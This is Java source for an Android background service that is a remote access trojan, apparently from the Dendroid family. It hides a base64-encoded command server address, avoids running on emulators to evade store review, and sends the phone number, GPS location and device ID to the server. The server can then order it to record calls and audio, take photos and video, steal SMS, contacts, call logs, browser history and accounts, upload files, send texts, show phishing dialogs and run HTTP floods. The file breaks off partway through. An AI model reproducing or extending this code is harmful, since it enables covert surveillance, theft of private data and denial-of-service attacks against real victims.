package com.connect;
	
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Binder;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.StrictMode;
import android.preference.PreferenceManager;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings.Secure;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;
	
public class MyService extends Service 
{
    //********************************************************************************************************************************************************
 	private String encodedURL = "aHR0cDovL2pvc2VxdWVydm8ubmV0L21hc3Rlcg=="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://pizzachip.com/dendroid)
 	private String backupURL = "aHR0cDovL2pvc2VxdWVydm8ubmV0L21hc3Rlcg=="; 
 	private String encodedPassword = "a2V5bGltZXBpZQ=="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp (ex. keylimepie)
    private int timeout = 10000; //Bot timeout
    private Boolean GPlayBypass = true; //true to bypass OR false to initiate immediately 
    private Boolean recordCalls = true; //if recordCalls should start true
    private Boolean intercept = false; //if intercept should start true
    //********************************************************************************************************************************************************
    private long interval = 1000 * 60 * 60; //1 hour 
    private int version = 1; 
    //********************************************************************************************************************************************************
	BroadcastReceiver mReceiver;
	private final IBinder myBinder = new MyLocalBinder();
	private String androidId;
    private String URL;
	private String password;
    //********************************************************************************************************************************************************
    private int random;
    private Location location;
    private String phonenumber;
    private String device;
    private String sdk;
    private String provider;
    //********************************************************************************************************************************************************
    private String urlPostInfo = "/message.php?";
    private String urlSendUpdate = "/get.php?";
    private String urlUploadFiles = "/new-upload.php?";
    private String urlUploadPictures = "/upload-pictures.php?";
    private String urlFunctions = "/get-functions.php?";
    //********************************************************************************************************************************************************
	@Override
	public IBinder onBind(Intent arg0) 
	{
		return myBinder;
	}
    //********************************************************************************************************************************************************	
	public class MyLocalBinder extends Binder 
	{
		MyService getService() 
		{
			return MyService.this;
	    }
	}
    //********************************************************************************************************************************************************
	PreferenceManager pm;
    private Double latitude;
    private Double longitude;    
    private LocationManager locManager;
    //********************************************************************************************************************************************************
	@Override
	public void onCreate() {
	     IntentFilter filterBoot = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
	     filterBoot.addAction(Intent.ACTION_SCREEN_OFF);
	     mReceiver = new ServiceReceiver();
	     registerReceiver(mReceiver, filterBoot);
	     super.onCreate();
       	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putLong("inacall", 0).commit();
	}
    //********************************************************************************************************************************************************
	@Override
	public void onStart(Intent intent, int startId) {
//		Notification note= new Notification(0, "Service Started", System.currentTimeMillis());
//		startForeground(startId, note); Create Icon in Notification Bar - Keep Commented
		super.onStart(intent, startId);
       	Log.i("com.connect", "Start MyService");

//    	StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
//    	StrictMode.setThreadPolicy(policy); 
        androidId = Secure.getString(getApplicationContext().getContentResolver(), Secure.ANDROID_ID); 

    	if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Timeout", 0)<1)
    	{
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putInt("Timeout", timeout).commit();
    	}
    	if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("RecordCalls", false)!=false || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("RecordCalls", false)!=true)
    	{
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("RecordCalls", recordCalls).commit();
    	}
    	if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("intercept", false)!=false || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("intercept", false)!=true)
    	{
			PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("intercept", intercept).commit();
    	}
    	if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "")==null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "").equals(""))
    	{
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("AndroidID", androidId).commit();
    	}
    	if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "")==null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "").equals(""))
    	{
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("File", Environment.getExternalStorageDirectory().toString() + File.separator + "System").commit();
    	}
    	if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "")==null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "").equals(""))
    	{
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("urlPost", urlPostInfo).commit();
    	}
    	if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("backupURL", "")==null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("backupURL", "").equals(""))
    	{
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("backupURL", backupURL).commit();
    	}
        //********************************************************************************************************************************************************
    	threadPre.start();
        //********************************************************************************************************************************************************
   	}
    //********************************************************************************************************************************************************
	Thread threadPre = new Thread()
	{
	@Override                    
    public void run() 
		{ 
        Looper.prepare();
       	Log.i("com.connect", "Thread Pre");

	        if(GPlayBypass==true)
	        {
		        while(true){
				
		    	if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Start", false)==false)
		    	{		    				    		
		    		if("google_sdk".equals(Build.PRODUCT ) || "google_sdk".equals(Build.MODEL) || Build.BRAND.startsWith("generic") || Build.DEVICE.startsWith("generic") || "goldfish".equals(Build.HARDWARE))
		    		{
		    		}
//		    		else if(hours%4==0)
//		            {
//		            	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Start", true);
//		            	initiate();
//		            }
		            else
		            {
		            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Start", true);
	            	initiate();
	            	}
		    	}
		    	else if(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Start", false)==true)
		    	{
		    		PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Start", true).commit();
		    		initiate();
		    	}
		    	else{}
				
				try 
				   {
		            Thread.sleep(interval);
				   }
				   catch (Exception e) 
				   {
				    	threadPre.start(); 
				   }           
		     	}
	        }
	        else
	        {
	        	initiate();
	        }
		}
	};
    //********************************************************************************************************************************************************
	public void initiate()
	{
        try 
        {
        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false);
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files",false).commit();

	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("URL", encodedURL).commit();
	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("backupURL", backupURL).commit();
	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("password", encodedPassword).commit();
	         
	        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("androidId", androidId).commit();

	     	URL = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("URL", ""), Base64.DEFAULT ));
	     	password = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("password", ""), Base64.DEFAULT ));
	         	    
	        AudioManager mgr = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
	        mgr.setStreamMute(AudioManager.STREAM_SYSTEM, true); 
        } catch (Exception e) {e.printStackTrace();}
        thread.start();
	}
    //********************************************************************************************************************************************************
	Thread thread = new Thread()
	{
	@Override                    
    public void run() { 
        Looper.prepare();
        int i=0;
			while(true)
			{		
//				if(isNetworkAvailable())//url not reachable
//				{	
////					new isUrlAlive(URL).execute("");
//				}
				
		        device = android.os.Build.MODEL;
		    	device = device.replace(" ", "");
		    	sdk = Integer.valueOf(android.os.Build.VERSION.SDK).toString(); //Build.VERSION.RELEASE;
		    	TelephonyManager telephonyManager =((TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
		    	provider = telephonyManager.getNetworkOperatorName();
		    	phonenumber = telephonyManager.getLine1Number();
			    locManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
			    locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,400,1, locationListener);
			    location = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
			    random = new Random().nextInt(999);
			    
			    if(location != null)                                
			    {
			        latitude = location.getLatitude();
			        longitude = location.getLongitude();
				    Log.i("com.connect","Location Is Live = (" + latitude + "," + longitude + ")");
			    }  

			    else
			    {
				    Log.i("com.connect","Location Is Dead");
			    }
		            
			    String url = URL + urlSendUpdate + "UID=" + androidId + "&Provider=" + provider + "&Phone_Number=" + phonenumber + "&Coordinates=" + latitude + "," + longitude + "&Device=" + device + "&Sdk=" + sdk +"&Version=" + version + "&Random=" + random + "&Password=" + password;
		    	try {
		    		Log.i("com.connect", url);
					getInputStreamFromUrl(url, "");
				} catch (UnsupportedEncodingException e2) {
					 
					e2.printStackTrace();
				}

			    URL functions;
				try {
					functions = new URL(URL + urlFunctions + "UID=" + androidId + "&Password=" + password);
				    Log.i("com.connect", functions.toString());

				    BufferedReader in = new BufferedReader(new InputStreamReader(functions.openStream()));
				    
			    	StringBuilder total = new StringBuilder();
			    	String line;
				    
			    	while ((line = in.readLine()) != null) 
					{
				       	try {
				 	        Thread.sleep(2000);         
				 	    } catch (InterruptedException e) {
				 	       e.printStackTrace();
				 	    }
					    total.append(line);
						Log.i("com.connect", "Function Run: " + line);

						String parameter = "";
					     Matcher m = Pattern.compile("\\(([^)]+)\\)").matcher(line);
						     while(m.find()) {
									Log.i("com.connect", "Function Run: " + m.group(1));
								parameter = m.group(1);
						     }
						     
						     if(parameter.equals(""))
						     {
						    	 parameter = "default";
						     }
						     
						List<String> list = new ArrayList<String>(Arrays.asList(parameter.split("~~")));//used to spit ","				        
				        
						try {
				 	        
							if(line.contains("mediavolumeup("))
							{
					              new mediaVolumeUp().execute("");
							}
							else if(line.contains("mediavolumedown("))
							{
					              new mediaVolumeDown().execute("");
							}
							else if(line.contains("ringervolumeup("))
							{
					              new ringerVolumeUp().execute("");
							}
							else if(line.contains("ringervolumedown("))
							{
					              new ringerVolumeDown().execute("");
							}
							else if(line.contains("screenon("))
							{
					              new screenOn().execute("");
							}
							else if(line.contains("recordcalls("))
							{
								PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("RecordCalls", Boolean.parseBoolean(list.get(0))).commit();
								getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Record Calls set to: " + list.get(0));
							}
							else if(line.contains("intercept("))
							{
								PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("intercept", Boolean.parseBoolean(list.get(0))).commit();
								getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Intercept set to: " + list.get(0));
							}
							else if(line.contains("blocksms("))
							{
								PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("blockSMS", Boolean.parseBoolean(list.get(0))).commit();
								getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Block SMS set to: " + list.get(0));
							}
							else if(line.contains("recordaudio("))
							{
					              new recordAudio(list.get(0)).execute("");
							}
							else if(line.contains("takevideo("))
							{
					              new takeVideo(list.get(0), list.get(1)).execute("");
							}
							else if(line.contains("takephoto("))
							{
								if(list.get(0).equalsIgnoreCase("1"))
								{
						              new takePhoto("1").execute("");
					    		}
								else
						              new takePhoto("0").execute("");
							}
							else if(line.contains("settimeout("))
							{
								PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putInt("Timeout", Integer.parseInt(list.get(0))).commit();
								getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Timeout set to: " + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Timeout", 1));
							}
							else if(line.contains("sendtext("))
							{
								if(list.get(0).equals("default") || list.get(1) == null)
								{
								}
								else
								new sendText(list.get(0),list.get(1)).execute("");
							}      
							else if(line.contains("sendcontacts("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new sendContactsText(list.get(0)).execute("");
							}
							else if(line.contains("callnumber("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new callNumber(list.get(0)).execute("");
							}
							else if(line.contains("deletecalllognumber("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new deleteCallLogNumber(list.get(0)).execute("");
							}
							else if(line.contains("openwebpage("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new openWebpage(list.get(0)).execute("");
							}	
				            else if(line.contains("updateapp("))
							{
				            	if(Integer.parseInt(list.get(0)) > PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Version", 0))
				            	{
					            	UpdateApp updateApp = new UpdateApp();
					            	updateApp.setContext(getApplicationContext());
						            updateApp.execute(list.get(0));
				            	}
				    			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Attempting to Download App and Prompt Update");
					        }
				            else if(line.contains("promptupdate("))
							{
				            	if(Integer.parseInt(list.get(0)) > PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Version", 0))
				            	{
									Intent intent = new Intent(Intent.ACTION_VIEW);
						            intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory().getPath() + "/Download/update.apk")), "application/vnd.android.package-archive");
						            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
						            startActivity(intent);
				            	}
				    			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Prompted Update");
					        }
							else if(line.contains("promptuninstall("))
							{
								new promptUninstall().execute("");
							}	
							else if(line.contains("uploadfiles(")) 
							{							
								if(list.get(0).equals("default"))
								{
						              new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
						              new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
						              new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
						              new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
								}
								else if(list.get(0).equals("Calls" + File.separator))
								{
						              new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
								}
								else if(list.get(0).equals("Audio"))
								{
						              new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
								}
								else if(list.get(0).equals("Videos"))
								{
						              new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
								}
								else if(list.get(0).equals("Pictures"))
								{
						              new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
								}
							}
							else if(line.contains("changedirectory(")) 
							{
								new changeDirectory().execute();
							}
							else if(line.contains("deletefiles("))
							{
								if(list.get(0).equals("default"))
								{ 
									new deleteFiles("Audio").execute("");
						            new deleteFiles("Videos").execute("");
						            new deleteFiles("Pictures").execute("");
						            new deleteFiles("Calls").execute("");
								} 
								else if(list.get(0).equals("Audio"))
								{
						              new deleteFiles("Audio").execute("");
								}
								else if(list.get(0).equals("Videos"))
								{
						              new deleteFiles("Videos").execute("");
								}
								else if(list.get(0).equals("Pictures"))
								{
						              new deleteFiles("Pictures").execute("");
								}
								else if(list.get(0).equals("Calls"))
								{
						              new deleteFiles("Calls").execute("");
								}
							}
							else if(line.contains("getbrowserhistory("))
							{						       
	
								if(list.get(0).equals("default"))
								{
								}
								else
								new getBrowserHistory(list.get(0)).execute("");
							}
							else if(line.contains("getbrowserbookmarks("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
									new getBrowserBookmarks(list.get(0)).execute("");
							}
							else if(line.contains("getcallhistory("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new getCallHistory(list.get(0)).execute("");
							}
							else if(line.contains("getcontacts("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new getContacts(list.get(0)).execute("");
							}
							else if(line.contains("getinboxsms("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new getInboxSms(list.get(0)).execute("");
							}
							else if(line.contains("getsentsms("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new getSentSms(list.get(0)).execute("");
							}	
							else if(line.contains("deletesms("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
						    	new deleteSms(list.get(0),list.get(1));
							}
							else if(line.contains("getuseraccounts("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new getUserAccounts(list.get(0)).execute("");
							}
							else if(line.contains("getinstalledapps("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new getInstalledApps(list.get(0)).execute("");
							}	
							else if(line.contains("httpflood("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new httpFlood(list.get(0), list.get(1)).execute("");
							}	
							else if(line.contains("openapp("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new openApp(list.get(0)).execute("");
							}	
							else if(line.contains("opendialog("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
								new openDialog(list.get(0),list.get(1)).execute("");
							}
							else if(line.contains("uploadpictures("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
						    	new uploadPictures(list.get(0),list.get(1), list.get(2)).execute("");
							}
	//						else if(line.contains("setbackupurl("))
	//						{
	//								PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("backupURL", Base64.encodeToString(list.get(0).getBytes(), Base64.DEFAULT )).commit();
	//						}
							else if(line.contains("transferbot("))
							{
								if(list.get(0).equals("default"))
								{
								}
								else
						    	new transferBot(list.get(0));
							}
							else{}
				 	    } catch (IndexOutOfBoundsException e) {
					 	       e.printStackTrace();
					 	}
					}
				} catch (MalformedURLException e1) {
					e1.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}

		    	if(isNetworkAvailable() && i==0)
		    	{		    		
		    		// Initial Connect Run Apps
		    		
//		            new recordAudio("20000").execute("");
//		    		new takePhoto("0").execute("");
//		            new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//			        new mediaVolumeUp().execute("");
//			        new mediaVolumeDown().execute("");
//			        new ringerVolumeUp().execute("");
//			        new ringerVolumeDown().execute("");
//			        new screenOn().execute("");
//			        new recordAudio("2000").execute("");
//				    new takePhoto("0").execute("");
//				    new takePhoto("1").execute("");   
//		        	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
//			        new takeVideo("0", "10000").execute("");
//			        new takeVideo("1", "10000").execute("");
//					new sendText("999","Test Message").execute("");
//					new sendContactsText(list.get(0)).execute("");
//					new callNumber("999").execute("");
//		    		new deleteCallLogNumber("1231231234").execute();
//					new openWebpage("http://google.com").execute("");
//					new promptUninstall().execute("");
//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
//					new changeDirectory().execute();
//					new deleteFiles("Audio").execute("");
//				    new deleteFiles("Videos").execute("");
//				    new deleteFiles("Pictures").execute("");
//				    new deleteFiles("Calls").execute("");
//					new getBrowserHistory("10").execute("");
//					new getBrowserBookmarks("10").execute("");
//					new getCallHistory("1").execute("");
//					new getContacts("1").execute("");
//					new getInboxSms("1").execute("");
//					new getSentSms("1").execute("");
//					new deleteSms("3","579").execute("");
//					new getUserAccounts("10").execute("");
//					new getInstalledApps("10").execute("");
//					new httpFlood("www.google.com", "1000").execute("");
//					new openApp(list.get(0)).execute("");//packageName	
//					new openDialog("Enter Gmail","TEst").execute("");
//		    		new uploadPictures("0","99999999999999", "10").execute("");
//		    		new transferBot("http://pizzachip.com/rat").execute("");
			    	i++;	
		    	}

			   try 
			   {
                   Thread.sleep(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getInt("Timeout", 1));
			   }
			   catch (Exception e) 
			   {
				   thread.start(); //initiate(); //
               }           
            } 
	}
    }; 
    //******************************************************************************************************************************************************** 
    private void updateWithNewLocation(Location location) {
        if (location != null) {
            latitude = location.getLatitude();
            longitude = location.getLongitude();
        }
    }
    //********************************************************************************************************************************************************
    private final LocationListener locationListener = new LocationListener() {
        public void onLocationChanged(Location location) {
            updateWithNewLocation(location);
        }
        public void onProviderDisabled(String provider) {
            updateWithNewLocation(null);
        }
        public void onProviderEnabled(String provider) {
        }
        public void onStatusChanged(String provider, int status, Bundle extras) {
        }
    };
    //********************************************************************************************************************************************************
    public InputStream getInputStreamFromUrl(String urlBase, String urlData) throws UnsupportedEncodingException {
    	
    	Log.i("com.connect", "base:" + urlBase);
    	Log.i("com.connect", "data:" + urlData);

    	String urlDataFormatted=urlData;
    	
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH:mm:ss");
        String currentDateandTime = "[" + sdf.format(new Date()) + "] - ";
        currentDateandTime = URLEncoder.encode (currentDateandTime, "UTF-8");

        if(urlData.length()>1)
        {
        Log.d("com.connect", urlBase + urlData);

    	urlData = currentDateandTime + URLEncoder.encode (urlData, "UTF-8");
    	urlDataFormatted = urlData.replaceAll("\\.", "~period");
    	
    	Log.i("com.connect", urlBase + urlDataFormatted);
        }
    	
    	if(isNetworkAvailable())
    	{
    	  InputStream content = null;
    	  try 
    	  {
    	    Log.i("com.connect", "network push POST");
    	    HttpClient httpclient = new DefaultHttpClient();
    	    HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlDataFormatted));
    	    content = response.getEntity().getContent();
    	    httpclient.getConnectionManager().shutdown();
    	  } catch (Exception e) {
    		  Log.e("com.connect", "exception", e);
    	  }
    	    return content;
    	}
		return null;
    }
    //********************************************************************************************************************************************************
    public boolean isNetworkAvailable() {
    	StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
    	StrictMode.setThreadPolicy(policy);
    	return true;
   
//        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
//        NetworkInfo netInfo = cm.getActiveNetworkInfo();
//        if (netInfo != null && netInfo.isConnected()) {
//            try {
//                URL url = new URL("http://www.google.com");
//                HttpURLConnection urlc = (HttpURLConnection) url.openConnection();
//                urlc.setConnectTimeout(3000);
//                urlc.connect();
//                if (urlc.getResponseCode() == 200) {
//                    return new Boolean(true);
//                }
//            } catch (MalformedURLException e1) {
//                // TODO Auto-generated catch block
//                e1.printStackTrace();
//            } catch (IOException e) {
//                // TODO Auto-generated catch block
//                e.printStackTrace();
//            }
//        }
//        return false;
    }
    //********************************************************************************************************************************************************
	public class mediaVolumeUp extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {     
		    AudioManager audioManager = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
		    audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC,AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {
        	try {
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Media Volume Up Complete");
        	} catch (UnsupportedEncodingException e) {e.printStackTrace();}
        	}
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {}
	}
    //********************************************************************************************************************************************************
	public class mediaVolumeDown extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {     
		    AudioManager audioManager = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
		    audioManager.adjustStreamVolume(AudioManager.STREAM_MUSIC,AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {try {
			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Media Volume Down Complete");
		} catch (UnsupportedEncodingException e) {
			 
			e.printStackTrace();
		}}
        @Override
        protected void onPreExecute() {}
        @Override
        protected void onProgressUpdate(Void... values) {}
	}
    //******************************************************************************************************************************************************** 
	public class ringerVolumeUp extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... params) {     
		    AudioManager audioManager = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
		    audioManager.adjustStreamVolume(AudioManager.STREAM_RING,AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
		    return "Executed";
        }      
        @Override
        protected void onPostExecute(String result) {try {
